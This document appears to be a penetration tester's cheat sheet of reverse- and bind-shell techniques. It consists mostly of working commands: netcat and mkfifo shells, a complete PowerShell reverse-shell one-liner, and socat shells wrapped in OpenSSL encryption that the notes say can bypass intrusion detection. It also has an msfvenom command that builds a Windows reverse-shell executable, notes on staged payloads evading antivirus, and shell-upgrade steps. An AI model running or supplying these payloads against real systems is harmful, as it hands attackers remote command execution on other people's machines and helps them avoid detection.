## Netcat

- "swiss army knife" for manual network interactions
- Accepts shells
- Listen with

```bash
nc -lvnp <port>
# -e "cmd.exe" for bind shell
# -l: listen
# -v: verbose
# -n: do not do DNS lookup
# -p: specify port
```

- send with:

```bash
nc <ip> <port> -e /bin/bash
# -e can be left for bind shell
```

- slightly better:

```bash
mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

- Windows one-liner to send shell:

```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('**<ip>**',**<port>**);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

## Socat

- netcat on steroids (stable shells)
- more difficult syntax, not installed by default

```bash
socat TCP-L:<port> FILE:`tty`,raw,echo=0
# equivalent to nc -lvnp, but more stable
```
```bash
socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
# equivalent to nc <ip> <port> -e /bin/bash, but more stable
```

### Encrypted Shells

- can bypass IDS, cannot be spied on!
- create certificate and merge:

```bash
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
#--
cat shell-key shell.crt > shell.pem
```

- listen via openssl (certificate needs to be on listener!):

```bash
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
```

- simple connect back:

```bash
socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
```

- listen via openssl AND use stable shell:

```bash
socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0
#--
socat OPENSSL:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```


## `/exploit/multi/handler`

- Listener for metasploit payload

#### `msfvenom`

- Creates metasploit payloads

```bash
msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
```

- list them via:

```bash
msfvenom --list payloads | grep ...
```

## Staged vs Stageless payloads

- Stagers are small pieces of code which are written to disk. they connect to the listener and download the actual payload and execute it directly in memory (bypass antivirus)

```bash
Example: # meterpreter/...
windows/x64/meterpreter/reverse_tcp
```

- Stageless payloads are bulky payloads which contain everything

```bash
Example: # meterpreter_...
linux/x86/meterpreter_reverse_tcp
````

- But: AMSI checks for malware in memory...

## different webshells

- payloads all the things github
- pentestmonkey reverse shell cheatsheet
- `/usr/share/webshells`

## upgrade shells

- with python:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
CTRL-Z
stty raw -echo && fg
export SHELL=bash
export TERM=xterm-256color
stty rows <num> columns <num> #get from stty -a
```

- rlwrap (also good for windows):

```bash
rlwrap nc -lvnp <port>
CTRL-Z
stty raw -echo && fg
```

